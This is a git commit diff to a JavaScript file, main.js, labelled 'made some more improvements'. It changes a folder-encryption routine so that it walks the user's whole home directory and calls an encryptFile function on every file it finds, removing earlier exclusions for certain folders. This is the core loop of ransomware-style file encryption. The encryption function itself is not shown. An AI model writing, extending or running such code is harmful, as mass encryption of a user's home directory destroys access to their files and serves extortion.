fb4086a33571dc2fb121a770d1d70f3bd7e5313f
Imade Chris <jephthahimade@gmail.com>
2023-03-24 10:46:24 +0100

    made some more improvements

--- main.js
+++ main.js
@@ -28,42 +28,35 @@ async function traverseDirectory(directory, callback) {
       return;
     }
 
-    const folderItems = await fs.readdir(directory);
-    for (const item of folderItems) {
-      const itemPath = path.join(directory, item);
-      const itemStats = await fs.stat(itemPath);
+    // Skip folders that require admin access
+    if (os.platform() !== "win32" || (folderStats.mode & 0o777) & 0o200) {
+      const folderItems = await fs.readdir(directory);
+      for (const item of folderItems) {
+        const itemPath = path.join(directory, item);
+        const itemStats = await fs.stat(itemPath);
 
-      if (itemStats.isDirectory() && item !== 'browser') {
-        await traverseDirectory(itemPath, callback);
-      } else if (itemStats.isFile()) {
-        await callback(itemPath);
+        if (itemStats.isDirectory()) {
+          await traverseDirectory(itemPath, callback);
+        } else if (itemStats.isFile()) {
+          await callback(itemPath);
+        }
       }
+    } else {
+      console.log(`Skipping folder ${directory} as it requires admin access`);
     }
   } catch (err) {
     console.error(`Error while traversing directory ${directory}: ${err}`);
   }
 }
 
-async function encryptFolder(folderPath) {
+async function encryptFilesInHomeDir() {
   try {
-    // Check if the folder requires permission and skip it if required
-    const folderPermissions = await fs.stat(folderPath);
-    if (!(folderPermissions.mode & fs.constants.S_IWUSR)) {
-      console.log(`Skipping folder ${folderPath} as it requires permission`);
-      return;
-    }
-
-    // Check if folder contains installations related to social media apps
-    const folderName = path.basename(folderPath);
-    if (/social-media-apps/.test(folderName)) {
-      console.log(`Skipping folder ${folderPath} as it contains installations related to social media apps`);
-      return;
-    }
-
-    await traverseDirectory(folderPath, encryptFile);
-    console.log(`Folder ${folderPath} encrypted.`);
+    const homeDir = os.homedir();
+    await traverseDirectory(homeDir, encryptFile);
+    console.log(`All files in home directory ${homeDir} encrypted.`);
   } catch (err) {
-    console.error(`Error while encrypting folder ${folderPath}: ${err}`);
+    console.error(`Error while encrypting files in home directory: ${err}`);
   }
 }
-module.exports = { encryptFolder };
+
+module.exports = { encryptFilesInHomeDir };
